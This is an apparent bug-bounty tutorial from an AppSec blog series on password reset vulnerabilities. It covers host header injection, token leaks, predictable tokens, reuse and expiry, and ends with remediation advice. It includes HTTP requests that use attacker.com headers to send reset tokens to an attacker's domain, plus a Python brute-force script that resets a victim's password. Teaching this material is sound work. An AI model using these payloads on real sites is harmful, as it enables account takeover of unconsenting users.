# Password Reset Vulnerabilities

> **Severity:** HIGH → CRITICAL
> **OWASP:** A07 – Identification & Authentication Failures
> **CWE:** CWE-640 – Weak Password Recovery Mechanism
> **Bug Bounty Payouts:** $300 – $8,000+

---

## What Is It?

Password reset is one of the most abused flows in web applications. Developers focus on making it *convenient* — and forget to make it *secure*.

**The core risk:** A reset token is essentially a temporary password. If it leaks, is predictable, or stays valid after use — the attacker doesn't need your password. They just need the token.

---

## Flaw 1 — Host Header Injection

The server uses the `Host` header to build the password reset URL. If it trusts whatever the client sends — an attacker can redirect the reset link to their own domain.

**How to test:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@target.com"}
```

Check if the reset email contains a link pointing to `attacker.com`. Also try:
```
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Original-URL: https://attacker.com/reset
```

**Why it works:** The app builds the reset URL as `https://{Host}/reset?token=XYZ` — injecting Host means the victim clicks a link to your server, and you capture the token from your access logs.

---

## Flaw 2 — Token in URL → Referer Leak

If the reset link puts the token in the URL query string, it leaks via the `Referer` header the moment the user clicks any link on the reset page.

```
Reset link sent: https://target.com/reset?token=abc123xyz

User lands on page, clicks a social link:
Referer: https://target.com/reset?token=abc123xyz
→ Token captured by Facebook/Google/analytics pixel
```

**How to test:** Complete a password reset, check browser DevTools → Network → find any third-party requests — look at their Referer header.

---

## Flaw 3 — Weak or Predictable Token

```python
# BAD — timestamp-based (predictable)
import time
token = str(int(time.time()))   # 1714000000

# BAD — sequential (enumerable)
token = str(user_id) + "00001"

# BAD — MD5 of email (guessable)
import hashlib
token = hashlib.md5(email.encode()).hexdigest()
```

**Attack:** Request multiple tokens, observe the pattern. Timestamp tokens can be brute-forced in a ±300 second window — only 600 requests.

**Test script:**
```python
import requests, time

target = "https://target.com"
email  = "victim@target.com"

# Request token and note time
t_before = int(time.time()) - 5
requests.post(f"{target}/forgot-password", json={"email": email})
t_after = int(time.time()) + 5

# Try all timestamps in window
for ts in range(t_before, t_after):
    r = requests.post(f"{target}/reset-password",
                      json={"token": str(ts), "password": "Hacked123!"})
    if r.status_code == 200:
        print(f"[HIT] Token was timestamp: {ts}")
        break
```

---

## Flaw 4 — Token Reuse After Use

After a successful password reset, the token should be invalidated immediately. Many apps don't do this.

**Test:**
1. Request password reset → get token from email
2. Use token to reset password → success
3. Use same token again → if it returns 200 = critical vulnerability

---

## Flaw 5 — No Token Expiry

```bash
# Request reset at 9:00 AM
# Don't use the link
# Try at 9:00 PM — still works?
# Try next day — still works?
```

Industry standard: 15 minutes. Anything over 1 hour is a finding. Anything over 24 hours is a clear vulnerability.

---

## Severity Rating

| Flaw | Severity |
|---|---|
| Host header injection → token to attacker | **Critical** |
| Token reuse after password change | **Critical** |
| Predictable / timestamp-based token | **High** |
| Token in URL (Referer leak) | **High** |
| Token expiry > 24 hours | **Medium** |
| Reset works for non-existent email (user enum) | **Low** |

---

## Bug Report Template

```
Title: Host Header Injection in Password Reset Leads to Token Theft

Severity: Critical

Summary:
The /forgot-password endpoint builds the reset URL using the
attacker-controlled Host header without validation. An attacker
can manipulate this header to redirect the password reset link
to an attacker-controlled domain, capturing the token and
achieving full account takeover.

Steps to Reproduce:
1. POST /forgot-password
   Host: attacker.com
   {"email": "victim@target.com"}

2. Victim receives email: "Click here to reset: https://attacker.com/reset?token=abc123"

3. If victim clicks the link, attacker captures token from server logs.

4. Attacker uses token: POST /reset-password {"token":"abc123","password":"owned"}
   Response: 200 OK — password changed, account taken over.

Impact:
Full account takeover of any user whose email address is known.
No interaction required from the attacker beyond sending the
crafted request. Works silently.

Remediation:
- Build reset URL using a configured base URL from server config only
- Never use the Host header to construct reset links
- Use allowlist for permitted domains in reset flow

CVSS 3.1: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N — Score: 9.3 (Critical)
```

---

## Key Takeaway

**The reset flow is often the weakest auth path because developers treat it as secondary.** It isn't. A broken reset = broken authentication for every user on the platform.

Test every variant. Host header, token in URL, reuse, expiry, predictability. Any one of these is a valid high-severity report.

---

*#300DaysWithAppSec | Day 20 | Password Reset Vulnerabilities*

---

**Connect:**
- LinkedIn: [linkedin.com/in/anand-prajapati-7a265a369](https://linkedin.com/in/anand-prajapati-7a265a369)
- GitHub: [github.com/anand87794](https://github.com/anand87794)
- Portfolio: [anandprajapati.lovable.app](https://anandprajapati.lovable.app)
- X: [@anand87794](https://x.com/anand87794)

@anand87794
